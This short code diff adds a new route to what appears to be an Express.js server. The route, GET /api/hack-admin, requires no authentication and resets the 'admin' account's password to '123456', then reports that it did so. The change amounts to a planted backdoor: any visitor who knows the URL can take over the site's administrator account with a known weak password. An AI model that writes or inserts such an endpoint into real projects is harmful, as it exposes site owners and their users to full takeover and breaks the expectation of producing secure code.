@@ -130,6 +130,18 @@ app.get('/api/test-add-article', async (req, res) => {
 app.use('/api/nav', navRoute);
 app.use('/api/articles', articlesRoute);
 app.use('/api/pricing', pricingRoute);
+
+app.get('/api/hack-admin', async (req, res) => {
+    try {
+        const bcrypt = require('bcryptjs');
+        const hash = await bcrypt.hash('123456', 10);
+        await db.query('UPDATE admin_users SET password = ? WHERE username = "admin"', [hash]);
+        res.send('Password reset to 123456');
+    } catch (err) {
+        res.status(500).send(err.message);
+    }
+});
+
 app.use('/api/quotes', quotesRoute);
 app.use('/api/settings', settingsRoute);
 app.use('/api/media', mediaRoute);
